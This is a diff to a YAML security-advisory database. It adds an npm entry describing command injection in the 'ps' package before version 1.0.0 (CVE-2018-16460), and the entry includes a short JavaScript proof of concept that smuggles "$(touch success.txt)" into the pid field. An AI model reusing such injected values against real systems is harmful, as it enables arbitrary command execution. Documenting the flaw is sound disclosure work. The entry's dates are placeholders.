@@ -1,5 +1,40 @@
 ---
-- id: snykio:npm:ps:CVE-2018-16460
+- id: npmjs:npm:ps:728
+  title: Command Injection
+  description: |-
+    Versions of `ps` before 1.0.0 are vulnerable to command injection.
+
+    Proof of concept:
+
+    ```
+    var ps = require('ps');
+
+    ps.lookup({ pid: "$(touch success.txt)" }, function(err, proc) { // this method is vulnerable to command injection
+        if (err) {throw err;}
+        if (proc) {
+            console.log(proc);  // Process name, something like "node" or "bash"
+        } else {
+            console.log('No such process');
+        }
+    });
+
+    // Result: The file success.txt will exist on the filesystem if the touch command was executed
+    ```
+  affected_package: ps
+  vulnerable_versions:
+  - "<1.0.0"
+  severity: moderate
+  package_manager: npm
+  cve:
+  - CVE-2018-16460
+  cwe: CWE-78
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Cristian-Alexandru Staicu
+  references: https://npmjs.com/advisories/728
+  source_url: https://npmjs.com/advisories/728
+- id: snykio:npm:ps:72307
   title: Arbitrary Command Injection
   description: |
     [ps][1] is A Node.js module for looking up running processes.
